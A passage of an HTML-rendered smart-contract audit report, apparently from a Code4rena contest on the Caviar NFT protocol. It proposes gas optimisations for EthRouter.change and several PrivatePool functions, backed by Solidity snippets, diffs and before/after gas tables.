class=\"grvsc-source\"><span class=\"mtk7\">+                PrivatePool(_sell.pool).sell(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    _tokenIds, _sell.tokenWeights, _sell.proof, _sell.stolenNftProofs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L261-L287\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L261-L287</a></p>\n<h3 id=\"cache-calldata-pointer-for-changesi-and-memory-pointers-for-changesiinputtokenids--changesioutputtokenids\" style=\"position:relative;\"><a href=\"#cache-calldata-pointer-for-changesi-and-memory-pointers-for-changesiinputtokenids--changesioutputtokenids\" aria-label=\"cache calldata pointer for changesi and memory pointers for changesiinputtokenids  changesioutputtokenids permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache calldata pointer for <code>changes[i]</code> and memory pointers for <code>changes[i].inputTokenIds</code> &#x26; <code>changes[i].outputTokenIds</code></h3>\n<p><em>Gas Savings for <code>EthRouter.change</code>, obtained via protocol’s tests: Avg 4314 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>284857</td>\n<td>298879</td>\n<td>217295</td>\n<td>4</td>\n</tr>\n<tr>\n<td>After</td>\n<td>279105</td>\n<td>293127</td>\n<td>212981</td>\n<td>4</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">261</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">262</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Change</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_change</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">263</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">264</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// transfer NFTs from caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">265</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">266</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">267</span><span class=\"mtk1\">:            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">268</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">269</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// approve pair to transfer NFTs from router</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">270</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">271</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">272</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// execute change</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">273</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">PrivatePool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk12\">change</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">274</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">275</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">inputTokenWeights</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">276</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">inputProof</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">277</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stolenNftProofs</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">278</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">279</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">outputTokenWeights</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">280</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">outputProof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">281</span><span class=\"mtk1\">:            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">282</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">283</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// transfer NFTs to caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">284</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">285</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">286</span><span class=\"mtk1\">:            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">287</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/EthRouter.sol b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 125001d..c63c2f8 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -259,11 +259,13 @@ contract EthRouter is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // loop through and execute the changes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; changes.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            Change memory _change = changes[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            Change calldata _change = changes[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256[] memory _inputTokenIds = _change.inputTokenIds;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256[] memory _outputTokenIds = _change.outputTokenIds;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer NFTs from caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            for (uint256 j = 0; j &lt; changes[i].inputTokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                ERC721(_change.nft).safeTransferFrom(msg.sender, address(this), _change.inputTokenIds[j]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            for (uint256 j = 0; j &lt; _inputTokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                ERC721(_change.nft).safeTransferFrom(msg.sender, address(this), _inputTokenIds[j]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // approve pair to transfer NFTs from router</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -271,18 +273,18 @@ contract EthRouter is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // execute change</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             PrivatePool(_change.pool).change{value: msg.value}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                _change.inputTokenIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                _inputTokenIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 _change.inputTokenWeights,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 _change.inputProof,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 _change.stolenNftProofs,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                _change.outputTokenIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                _outputTokenIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 _change.outputTokenWeights,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 _change.outputProof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer NFTs to caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            for (uint256 j = 0; j &lt; changes[i].outputTokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                ERC721(_change.nft).safeTransferFrom(address(this), msg.sender, _change.outputTokenIds[j]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            for (uint256 j = 0; j &lt; _outputTokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                ERC721(_change.nft).safeTransferFrom(address(this), msg.sender, _outputTokenIds[j]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<h2 id=\"g-02-use-calldata-instead-of-memory-for-function-arguments-that-do-not-get-mutated\" style=\"position:relative;\"><a href=\"#g-02-use-calldata-instead-of-memory-for-function-arguments-that-do-not-get-mutated\" aria-label=\"g 02 use calldata instead of memory for function arguments that do not get mutated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] Use calldata instead of memory for function arguments that do not get mutated</h2>\n<p>When you specify a data location as <code>memory</code>, that value will be copied into memory. When you specify the location as <code>calldata</code>, the value will stay static within calldata. If the value is a large, complex type, using <code>memory</code> may result in extra memory expansion costs.</p>\n<p><strong>Note: We are able to change these instances from memory to calldata without causing a <code>stack too deep</code> error.</strong></p>\n<p>Total Instances: <code>4</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L385-L393\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L385-L393</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L459\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L459</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L661-L664\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L661-L664</a></p>\n<p><em>Gas Savings for <code>PrivatePool.change</code>, obtained via protocol’s tests: Avg 1489 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>116432</td>\n<td>142008</td>\n<td>82138</td>\n<td>17</td>\n</tr>\n<tr>\n<td>After</td>\n<td>114756</td>\n<td>139483</td>\n<td>80649</td>\n<td>17</td>\n</tr>\n</tbody>\n</table>\n<p><em>Gas Savings for <code>PrivatePool.execute</code>, obtained via protocol’s tests: Avg 340 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>18340</td>\n<td>36348</td>\n<td>18890</td>\n<td>6</td>\n</tr>\n<tr>\n<td>After</td>\n<td>17976</td>\n<td>35939</td>\n<td>18550</td>\n<td>6</td>\n</tr>\n</tbody>\n</table>\n<p><strong>Note: <code>PrivatePool.sumWeightsAndValidateProof</code> is called by the functions below</strong>.</p>\n<p><em>Gas Savings for <code>PrivatePool.buy</code>, obtained via protocol’s tests: Avg 147 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>74037</td>\n<td>158864</td>\n<td>70884</td>\n<td>24</td>\n</tr>\n<tr>\n<td>After</td>\n<td>73887</td>\n<td>158708</td>\n<td>70737</td>\n<td>24</td>\n</tr>\n</tbody>\n</table>\n<p><em>Gas Savings for <code>PrivatePool.sell</code>, obtained via protocol’s tests: Avg 171 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>50139</td>\n<td>170448</td>\n<td>81969</td>\n<td>25</td>\n</tr>\n<tr>\n<td>After</td>\n<td>49989</td>\n<td>170256</td>\n<td>81798</td>\n<td>25</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">385</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">change</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">386:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">inputTokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">387:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">inputTokenWeights</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">388:        </span><span class=\"mtk10\">MerkleMultiProof</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">inputProof</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">389:        </span><span class=\"mtk10\">IStolenNftOracle</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Message</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">stolenNftProofs</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">390:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">outputTokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">459:    </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">target</span><span class=\"mtk1\">, </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">data</span><span class=\"mtk1\">) </span><span class=\"mtk10\">public</span><span class=\"mtk1\"> </span><span class=\"mtk10\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk10\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">661</span><span class=\"mtk1\">:    </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">sumWeightsAndValidateProof</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">662</span><span class=\"mtk1\">:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenIds</span><span class=\"mtk1\">,</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..914dace 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -383,11 +383,11 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param outputTokenWeights The weights of the NFTs to receive.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param outputProof The merkle proof for the weights of each NFT to receive.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function change(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256[] memory inputTokenIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[] calldata inputTokenIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] memory inputTokenWeights,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         MerkleMultiProof memory inputProof,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         IStolenNftOracle.Message[] memory stolenNftProofs,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256[] memory outputTokenIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[] calldata outputTokenIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] memory outputTokenWeights,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         MerkleMultiProof memory outputProof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) public payable returns (uint256 feeAmount, uint256 protocolFeeAmount) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -456,7 +456,7 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param target The address of the target contract.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param data The data to send to the target contract.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @return returnData The return data of the transaction.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    function execute(address target, bytes memory data) public payable onlyOwner returns (bytes memory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function execute(address target, bytes calldata data) public payable onlyOwner returns (bytes memory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // call the target with the value and data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         (bool success, bytes memory returnData) = target.call{value: msg.value}(data);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -659,7 +659,7 @@ contract PrivatePool is ERC721TokenReceiver 